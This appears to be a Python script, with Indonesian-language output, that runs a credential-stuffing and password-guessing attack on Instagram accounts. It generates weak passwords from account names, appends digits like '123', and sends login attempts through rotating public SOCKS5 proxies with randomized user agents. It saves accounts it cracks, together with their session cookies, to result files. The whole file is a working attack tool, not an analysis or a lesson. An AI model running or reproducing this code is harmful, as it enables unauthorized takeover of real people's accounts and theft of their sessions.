import requests, json, time, random, calendar, datetime
from datetime import datetime
#----------- MODULE RICH -------------
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree

from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
current_GMT = time.gmtime(time.time())
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
reed = "[bold red]"
blue = "[bold blue]"
try:
    xnxx = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(xnxx)
except Exception as e:
    exit(e)
prox=open('.prox.txt','r').read().splitlines()

class Krek:

    def __init__(self, xx, xz):
        self.pwa, self.xxx = [], xx
        self.ses = requests.Session()
        self.ok, self.cp, self.loop = [], [], 0
        self.progg(xz)

    def ua_ig(self):
        xx = "Mozilla/5.0 (Linux; Android 5.1; S5140 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 Instagram 86.0.0.24.87 Android (22/5.1; 320dpi; 720x1184; S5140/GINZZU; S5140; S5140; mt6735; ru_RU; 147375141)"
        return xx

    def progg(self, oh):
        prints(Panel("      [[bold green]+[/]] cracking sendang di mulai [[bold green]+[/]]", style="bold white", padding=(0,5)))
        global prog,des
        prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(self.xxx))
        with prog:
            with Modol(max_workers=30) as bool:
                for i in self.xxx:
                    try:
                        username=i.split("|")[0]
                        password=i.split("|")[1].lower()
                        for w in password.split(" "):
                            if len(w)<3:
                                continue
                            else:
                                w=w.lower()
                                if oh in ["1", "01"]:
                                    if len(w)==3 or len(w)==4 or len(w)==5:
                                        sandi=[w,w+'123',w+'1234']
                                    else:
                                        sandi=[w]
                                elif oh in ["2", "02"]:
                                    if len(w)==3 or len(w)==4 or len(w)==5:
                                        sandi=[w,w+'123',w+'1234',w+'12345',w+'123456']
                                    else:
                                        sandi=[w,w+'123',w+'1234',w+'12345',w+'123456']
                                elif oh in ["3", "03"]:
                                    if len(w)==3 or len(w)==4 or len(w)==5:
                                        sandi=[w,w+'123',w+'1234',w+'12345',w+'123456',password.lower()]
                                    else:
                                        sandi=[w,w+'123',w+'1234',w+'12345',w+'123456',w,password.lower()]
                                elif oh in ["4", "04"]:
                                    for kontol in self.pwa:
                                        sandi=[w,w+'123',w+'1234',w+'12345',w+'123456']
                                        sandi.append(kontol)
                                bool.submit(self.crack,username,sandi)

                    except:
                        pass
        prints()
        prints(Panel(f' [[bold green]✓[/]] proses crack selesai...', padding=(0,2),style="bold white"))
        exit()

    def ingfo(self, user):
        try:
            data = self.ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'}).json()["data"]["user"]
            nama = data["full_name"]
            pengikut = data["edge_followed_by"]["count"]
            mengikut = data["edge_follow"]["count"]
            postingan = data["edge_owner_to_timeline_media"]["count"]
        except:
            pass
        return nama,pengikut,mengikut,postingan

    def crack(self, user, pasw):
        prog.update(des,description=f"{str(self.loop)}/{len(self.xxx)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses=requests.Session()
                tes=calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks5://'+nip}
                aa='Mozilla/5.0 (Linux; Android 6.0;'
                b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
                c='Nexus 5 Build/MRA58N)'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/537.36'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=ses.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'connenction': 'keep-alive',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '57ac339ce6f4',
                    'content-type': 'application/x-www-form-urlencoded',
                    'accept': '*/*',
                    'x-requested-with': 'XMLHttpRequest',
                    'x-asbd-id': '198387',
                    'user-agent': uaku,
                    'x-csrftoken': token.cookies['csrftoken'],
                    'x-ig-app-id': '1217981644879628',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{tes}:{pw}",
                    "username": user,
                    "queryParams": "{}",
                    "optIntoOneTap": 'false',
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=ses.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                z=json.loads(x.text)
                time.sleep(00.1)
                if "userId" in str(z):
                    nama,pengikut,mengikut,postingan=self.ingfo(user)
                    coki  = ";".join([key+"="+value.replace('"','') for key, value in x.cookies.get_dict().items()])
                    tree = Tree("")
                    tree.add(f"[bold white]nama akun : [bold green]{nama}")
                    tree.add(f"[bold white]username  : [bold green]{user}")
                    tree.add(f"[bold white]password  : [bold green]{pw}")
                    tree.add(f"[bold white]followers : [bold green]{pengikut}")
                    tree.add(f"[bold white]following : [bold green]{mengikut}")
                    tree.add(f"[bold white]postingan : [bold green]{postingan}").add(f"[bold green]{coki}")
                    prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{pengikut}|{mengikut}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint_url" in str(z):
                    tree = Tree("")
                    nama,pengikut,mengikut,postingan=self.ingfo(user)
                    tree.add(f"[bold white]nama akun : [bold yellow]{nama}")
                    tree.add(f"[bold white]username  : [bold yellow]{user}")
                    tree.add(f"[bold white]password  : [bold yellow]{pw}")
                    tree.add(f"[bold white]followers : [bold yellow]{pengikut}")
                    tree.add(f"[bold white]following : [bold yellow]{mengikut}")
                    tree.add(f"[bold white]postingan : [bold yellow]{postingan}")
                    prints(tree)
                    wrt = (f" [×] {user}|{pw}|{pengikut}|{mengikut}")
                    self.cp.append(wrt)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                        w.write(wrt+"\n")
                    break
                elif "Please wait" in str(z):
                    time.sleep(10)
                    self.crack(user, pw)
                else:
                    continue
            except requests.ConnectionError:
                time.sleep(5)
          #  except Exception as e:
           #     prints(e)

        self.loop+=1